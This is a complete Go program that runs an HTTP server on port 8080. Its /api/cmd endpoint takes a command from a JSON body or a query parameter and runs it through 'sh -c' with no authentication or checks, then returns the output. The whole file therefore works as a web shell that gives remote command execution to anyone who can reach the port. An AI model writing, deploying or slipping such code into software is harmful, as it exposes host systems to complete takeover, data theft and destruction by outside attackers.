package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os/exec"
)

type Command struct {
	Cmd string `json:"cmd"`
}

func httpserver() {
	fmt.Println("starting server at 8080")
	http.HandleFunc("/api/cmd", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}

		var cmdStr string
		if r.Header.Get("Content-Type") == "application/json" {
			var cmd Command
			body, err := ioutil.ReadAll(r.Body)
			if err != nil {
				http.Error(w, err.Error(), http.StatusBadRequest)
				return
			}
			err = json.Unmarshal(body, &cmd)
			if err != nil {
				http.Error(w, err.Error(), http.StatusBadRequest)
				return
			}
			cmdStr = cmd.Cmd
		} else {
			cmdStr = r.URL.Query().Get("cmd")
		}

		cmd := exec.Command("sh", "-c", cmdStr)
		var out bytes.Buffer
		cmd.Stdout = &out
		err := cmd.Run()
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}

		fmt.Fprint(w, out.String())
	})

	log.Fatal(http.ListenAndServe(":8080", nil))
}

func main() {
	httpserver()
}
